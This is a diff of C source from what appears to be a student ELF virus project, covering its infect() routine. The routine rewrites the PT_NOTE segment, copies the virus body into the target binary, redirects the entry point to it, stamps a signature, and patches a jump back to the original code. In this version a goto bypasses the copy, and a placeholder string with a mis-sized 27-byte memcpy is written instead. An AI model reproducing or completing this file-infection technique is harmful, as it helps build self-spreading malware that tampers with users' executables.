@@ -6,7 +6,7 @@
 /*   By: nguiard <marvin@42.fr>                     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/10/31 10:47:01 by nguiard           #+#    #+#             */
-/*   Updated: 2024/11/06 12:47:27 by nguiard          ###   ########.fr       */
+/*   Updated: 2024/11/07 09:51:11 by nguiard          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -60,30 +60,30 @@ bool	infect(profiling *this, const str path) {
 	//	Change the PT_NOTE segment
 	change_note_segment(this, &data);
 
-
+	ft_memcpy(data.file + data.infection_offset, (byte *)"Le virus aurait ete ici", 27);
 
 	goto infect_end;
 	//	Copy the code
-	ft_memcpy(file_origin + data.infection_offset, this->start_rip, this->size);
+	ft_memcpy(data.file + data.infection_offset, this->start_rip, this->size);
 	
 	//	Change the entrypoint
 	data.elf->e_entry = data.infection_offset;
 	
 	//	Copy signature
-	ft_memcpy(file_origin + data.infection_offset + this->size + SIGNATURE_OFFSET, this->signature, SIGNATURE_LEN);
-	printf("Written %s at 0x%lx\n", file_origin + data.infection_offset + this->size + SIGNATURE_OFFSET,
+	ft_memcpy(data.file + data.infection_offset + this->size + SIGNATURE_OFFSET, this->signature, SIGNATURE_LEN);
+	printf("Written %s at 0x%lx\n", data.file + data.infection_offset + this->size + SIGNATURE_OFFSET,
 		data.infection_offset + this->size + SIGNATURE_OFFSET);
 
 	int	new_jump = 0 - (data.infection_offset + this->size) + data.original_entry_point + 12;
 
 
 	write(ret, 1, &new_jump, 4);
-	ft_memcpy(file_origin + data.infection_offset + this->size - 16, (byte *)&new_jump, 4);
-	write(ret, 1, file_origin + data.infection_offset + this->size - 16, 4);
+	ft_memcpy(data.file + data.infection_offset + this->size - 16, (byte *)&new_jump, 4);
+	write(ret, 1, data.file + data.infection_offset + this->size - 16, 4);
 
 	// Logic ends
 	infect_end:
-	munmap(ret, file_origin, file_stat.st_size);
+	munmap(ret, data.file, file_stat.st_size);
 	close(fd);
 
 	return false;
